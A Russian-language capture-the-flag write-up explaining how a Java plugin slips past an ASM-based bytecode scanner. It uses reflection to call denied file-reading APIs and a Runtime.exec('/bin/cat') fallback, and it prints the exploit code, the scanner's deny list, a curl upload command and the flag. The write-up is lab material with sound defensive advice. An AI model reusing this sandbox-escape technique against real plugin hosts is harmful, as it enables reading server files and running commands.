# B2Bee — технический разбор

**Флаг:** `avito{juSt_34Sy_biG_DISCoUNt}`
**Класс:** Java / static bytecode analysis bypass / sandbox escape

## Краткое техническое резюме

Сервис выполняет uploaded Java plugins после ASM-based static validation. Policy анализирует owners
bytecode instructions и отдельные constant types, но не выполняет data-flow analysis и не проверяет
обычные string constants. Prefix allowlist `java/lang` одновременно разрешает `Class` и весь пакет
`java/lang/reflect`.

Payload использует `Class.forName` и `Method.invoke` для runtime resolution запрещённых APIs. На
уровне bytecode видны только разрешённые owners, а имена `java.nio.file.Files` и
`java.lang.Runtime` передаются как strings. Plugin проходит scanner, читает `/flag.txt` и возвращает
его через `PluginResult.message`.

---

## 1. Контекст и цель

Endpoint `POST /api/plugins/run` принимает JAR в multipart field `plugin`, имя entry class в
`entryClass` и test cart в `cart`. Entry class должен реализовывать
`ru.avitoctf.marketplugins.api.DiscountPlugin`.

Перед execution сервер применяет `PluginScanner.java` и `SandboxPolicy.java`, исходный код которых
доступен в challenge artifacts. Требуется реализовать plugin, который проходит scanner и получает
доступ к server-side `/flag.txt`.

Service URL:

```text
https://marketplugins-4qop8u5n.avitoctf.ru/
```

## 2. Reconnaissance и attack surface

Scanner использует ASM и проверяет superclass, interfaces, instruction owners и отдельные constant
pool entries. Основная policy имеет prefix-based lists:

```java
ALLOWED = { "java/lang", "java/util", "java/math", "java/time",
            "ru/avitoctf/marketplugins/api", "ru/avitoctf/marketplugins/model" };
DENIED  = { "java/lang/Runtime", "java/lang/Process", "java/lang/ProcessBuilder",
            "java/lang/ProcessHandle", "java/lang/System", "java/lang/Thread",
            "java/lang/ClassLoader", "java/lang/SecurityManager", "java/nio/file",
            "ru/avitoctf/marketplugins/sandbox", ".../service", ".../web" };
```

`checkOwner` использует `startsWith`. Поэтому allowlist entry `java/lang` разрешает:

- `java/lang/Class`;
- `java/lang/reflect/Method`;
- остальные reflection APIs внутри `java/lang/reflect/*`.

`inspectConstant` блокирует `ConstantDynamic`, `Handle` и method `Type`, но игнорирует обычные
`String` constants. Scanner также не отслеживает flow от string literal до `Class.forName` или
`Method.invoke`.

Дополнительная weakness:

```java
if (!owner.contains("/")) return;
```

Owners без slash, включая некоторые primitive array descriptors, проходят policy без validation.
Основной exploit path не зависит от этого condition, но оно расширяет bypass surface.

## 3. Анализ и проверка гипотез

### 3.1. Reflection primitive

Запрещённый API разрешается только во время runtime:

```java
Class<?> paths = Class.forName("java.nio.file.Paths");
Class<?> pathType = Class.forName("java.nio.file.Path");
Class<?> files = Class.forName("java.nio.file.Files");
Object pathObj = paths.getMethod("get", String.class, String[].class)
    .invoke(null, path, new String[0]);
Object bytes = files.getMethod("readAllBytes", pathType).invoke(null, pathObj);
return new String((byte[]) bytes);
```

Static owners этого fragment относятся к `java/lang/Class`, `java/lang/reflect/Method` и другим
allowlisted classes. Denied class names присутствуют только как string data.

`grab()` перебирает paths `/flag.txt`, `flag.txt`, `/flag`, `/app/flag.txt` и
`/home/app/flag.txt`, используя три reflection-based strategies:

1. `Files.readAllBytes(Paths.get(path))`;
2. `FileInputStream(path).readAllBytes()`;
3. `Runtime.getRuntime().exec({"/bin/cat", path})`.

Objects запрещённых classes сохраняются с declared type `Object` и обрабатываются через reflection.

### 3.2. Исключение `invokedynamic`

Scanner безусловно блокирует opcode `invokedynamic`. Современный `javac` может генерировать его для
string concatenation, lambdas и method references. Payload поэтому:

- не использует lambdas и method references;
- собирает dynamic strings через `StringBuilder`;
- компилируется с `-XDstringConcat=inline`;
- проверяется через `javap -c` на отсутствие `invokedynamic`.

### 3.3. Return channel

Entry point возвращает содержимое файла в application-visible field:

```java
public PluginResult apply(PluginContext context) throws Exception {
    String flag = grab();
    return new PluginResult(1337, 4242, flag);
}
```

Frontend отображает `PluginResult.message`, поэтому отдельный outbound channel не требуется.

## 4. Корневая причина

`PluginScanner` реализует syntactic deny/allow policy без semantic analysis:

1. prefix `java/lang` слишком широк и включает reflection;
2. `java/lang/Class` и `java/lang/reflect/*` отсутствуют в denylist;
3. string constants не инспектируются;
4. отсутствуют taint tracking и data-flow analysis;
5. runtime class/method resolution не моделируется;
6. owners без slash автоматически разрешаются;
7. plugin-local classes считаются trusted.

Static owner filtering не является security boundary. Reflection превращает разрешённые calls в
универсальный dispatch primitive, а scanner не способен определить фактическую runtime target.

## 5. Эксплуатация

### 5.1. Сборка и локальная validation

```bash
cd task6/exploit
bash build.sh
```

`build.sh` выполняет:

1. compilation с `--release 21 -XDstringConcat=inline`;
2. packaging `seasonal-discount-plugin.jar`;
3. проверку отсутствия policy classes внутри JAR;
4. `javap` validation на отсутствие `invokedynamic`;
5. compilation исходного `PluginScanner` и `SandboxPolicy` с test harness;
6. scanner execution для exploit JAR;
7. negative control для plugin с direct `java.nio.file` call.

Ожидаемые результаты:

```text
RESULT: SCAN PASSED
SCAN BLOCKED [blocked-direct-call]
```

Negative control подтверждает, что scanner активен, а exploit использует конкретный policy bypass.

### 5.2. Upload

```bash
curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
  -F "plugin=@task6/exploit/build/dist/seasonal-discount-plugin.jar;type=application/java-archive" \
  -F "entryClass=example.SeasonalDiscountPlugin" \
  -F 'cart={"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
```

Cart должен содержать хотя бы один item, иначе application не запускает plugin. Полный pipeline:

```bash
uv run python task6/solve_task6.py
```

Флаг возвращается в `result.message`.

## 6. Флаг

```text
avito{juSt_34Sy_biG_DISCoUNt}
```

## 7. Выводы и рекомендации

- Uploaded code нельзя изолировать только через bytecode denylist. Нужна отдельная JVM/process boundary
  с минимальными filesystem и syscall capabilities.
- Allowlist должна перечислять exact classes и methods; broad package prefixes неприемлемы для
  security policy.
- Reflection, method handles, dynamic class loading и native access должны быть недоступны untrusted
  plugins.
- Scanner regression tests должны включать negative controls и обходы через strings, reflection,
  arrays, descriptors и dynamic bytecode constructs.
- Даже расширенный static analysis не заменяет runtime sandbox: ограничения следует обеспечивать
  OS-level isolation, read-only filesystem, seccomp и минимальным service account.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task6/solve_task6.py` — build, local validation, upload и extraction `result.message`.
- `task6/exploit/src/example/SeasonalDiscountPlugin.java` — exploit source.
- `task6/exploit/build.sh` — reproducible JDK 21 build; pinned ASM artifacts проверяются по SHA-256.
- `task6/exploit/harness/Verify.java` — локальный scanner harness.
- `task6/exploit/harness/example/BlockedPlugin.java` — negative control.
- `task6/marketplugins/PluginScanner.java` и `task6/marketplugins/SandboxPolicy.java` — анализируемая
  server-side policy.
